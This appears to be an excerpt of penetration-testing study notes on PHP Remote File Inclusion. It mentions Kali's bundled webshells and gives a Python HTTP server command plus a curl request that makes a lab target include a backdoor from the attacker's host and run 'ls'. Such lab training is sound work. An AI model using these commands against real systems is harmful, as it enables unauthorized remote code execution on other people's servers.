...
This requires the `allow_url_include` setting to be enabled.  It is DISABLED by default in all current versions of PHP.
...
This also requires the `allow_url_include` setting to be enabled.  It is DISABLED by default in all current versions of PHP.

Kali comes with a couple webshell's by default in `/usr/share/webshells/` directory.

In order to pull off Remote File Inclusion, we need to have a file that is accessible from the target system so we can serve up files.  We can do that with python, `python3 -m http.server 80`.

Then, we can run `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.your.ip/simple-backdoor.php&cmd=ls"`
